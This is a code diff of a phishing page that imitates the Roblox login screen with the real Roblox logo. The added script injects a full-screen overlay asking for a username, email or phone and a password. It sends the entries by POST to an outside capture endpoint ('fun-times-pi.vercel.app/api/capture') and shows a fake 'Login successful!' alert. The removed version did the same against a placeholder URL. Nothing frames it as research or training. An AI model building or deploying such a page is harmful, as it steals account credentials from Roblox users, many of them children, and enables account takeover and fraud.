@@ -6,61 +6,140 @@
     <title>Roblox Login</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+            background-color: #eeeeee;
         }
-        .login-container {
-            background-color: #fff;
-            padding: 20px;
+        img {
+            display: block;
+            width: 320px;
+            margin: 60px auto;
+        }
+        .roblox {
+            background-color: #ffffff;
+            width: 330px;
+            margin: 50px auto 10px auto;
+            padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px -3px #333;
             text-align: center;
         }
-        .login-container h2 {
-            margin-bottom: 20px;
-        }
-        .login-container input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
+        input {
             border-radius: 4px;
+            padding: 10px 15px;
+            width: 50%;
+            border: 1px solid #D9D9D9;
+            outline: none;
+            display: block;
+            margin: 20px auto 20px auto;
         }
-        .login-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #0077ff;
-            color: #fff;
+        button {
+            border-radius: 3px;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            background: #719BE6;
+            width: 50%;
+            padding: 10px;
+            color: #FFFFFF;
+            margin-top: 25px;
+            box-shadow: 0 2px 10px -3px #719BE6;
+            display: block;
+            margin: 55px auto 10px auto;
+        }
+        .Cancel button {
+            background-color: #ff0000;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h2>Roblox Login</h2>
-        <input type="text" id="username" placeholder="Username" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button onclick="submitLogin()">Login</button>
+    <div class="roblox">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Roblox_Red_2017_Logo.png">
+        <input type="email" name="email" placeholder="Username/Email/Phone" />
+        <input type="password" name="password" placeholder="Password" />
+        <div class="Cancel">
+            <button>Cancel</button>
+        </div>
+        <div class="Login">
+            <button>Log in</button>
+        </div>
     </div>
 
     <script>
-        function submitLogin() {
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://your-vercel-url.com/api/capture", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
-            alert("Login successful!");
-        }
+        (function() {
+            // Define environment variables
+            const ENV = {
+                API_URL: "https://fun-times-pi.vercel.app/api/capture"
+            };
+
+            // Create an overlay element
+            var overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
+            overlay.style.zIndex = '9999';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
+
+            // Create a login container
+            var loginContainer = document.createElement('div');
+            loginContainer.style.backgroundColor = '#fff';
+            loginContainer.style.padding = '20px';
+            loginContainer.style.borderRadius = '8px';
+            loginContainer.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.1)';
+            loginContainer.style.width = '330px';
+            loginContainer.style.textAlign = 'center';
+
+            // Create login elements
+            var title = document.createElement('h2');
+            title.textContent = 'Roblox Login';
+            loginContainer.appendChild(title);
+
+            var usernameInput = document.createElement('input');
+            usernameInput.type = 'email';
+            usernameInput.name = 'email';
+            usernameInput.placeholder = 'Username/Email/Phone';
+            usernameInput.required = true;
+            loginContainer.appendChild(usernameInput);
+
+            var passwordInput = document.createElement('input');
+            passwordInput.type = 'password';
+            passwordInput.name = 'password';
+            passwordInput.placeholder = 'Password';
+            passwordInput.required = true;
+            loginContainer.appendChild(passwordInput);
+
+            var cancelButton = document.createElement('button');
+            cancelButton.textContent = 'Cancel';
+            cancelButton.style.backgroundColor = '#ff0000';
+            cancelButton.onclick = function() {
+                document.body.removeChild(overlay);
+            };
+            loginContainer.appendChild(cancelButton);
+
+            var loginButton = document.createElement('button');
+            loginButton.textContent = 'Log in';
+            loginButton.onclick = function() {
+                submitLogin(usernameInput.value, passwordInput.value);
+            };
+            loginContainer.appendChild(loginButton);
+
+            // Append the login container to the overlay
+            overlay.appendChild(loginContainer);
+
+            // Append the overlay to the body
+            document.body.appendChild(overlay);
+
+            // Function to submit login credentials
+            function submitLogin(username, password) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", ENV.API_URL, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
+                alert("Login successful!");
+            }
+        })();
     </script>
 </body>
 </html>
